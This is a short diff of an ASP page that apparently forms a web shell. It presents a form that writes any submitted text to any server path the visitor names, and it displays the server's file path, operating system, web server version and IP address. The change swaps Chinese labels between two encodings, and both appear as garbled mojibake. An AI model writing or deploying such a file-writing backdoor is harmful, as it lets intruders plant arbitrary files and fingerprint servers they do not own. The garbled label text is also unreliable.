@@ -16,9 +16,9 @@ if err=0 then%>
 <%set da=nothing%><%set fos=nothing%>
 <%="<form action='' method=post>"%>
 <%="<input type=text name=path>"%><br>
-<%="µ±Ç°ÎÄ¼þÂ·¾¶:"&server.mappath(request.servervariables("script_name"))%><br>
-<%="²Ù×÷ÏµÍ³Îª:"&Request.ServerVariables("OS")%><br>
-<%="WEB·þÎñÆ÷°æ±¾Îª:"&Request.ServerVariables("SERVER_SOFTWARE")%><br>
-<%="·þÎñÆ÷µÄIPÎª:"&Request.ServerVariables("LOCAL_ADDR")%><br><%=""%>
+<%="å½“å‰æ–‡ä»¶è·¯å¾„:"&server.mappath(request.servervariables("script_name"))%><br>
+<%="æ“ä½œç³»ç»Ÿä¸º:"&Request.ServerVariables("OS")%><br>
+<%="WEBæœåŠ¡å™¨ç‰ˆæœ¬ä¸º:"&Request.ServerVariables("SERVER_SOFTWARE")%><br>
+<%="æœåŠ¡å™¨çš„IPä¸º:"&Request.ServerVariables("LOCAL_ADDR")%><br><%=""%>
 <%="<textarea name=da cols=50 rows=10 width=30></textarea>"%><br>
 <%="<input type=submit value=save>"%><%="</form>"%><%end if%>
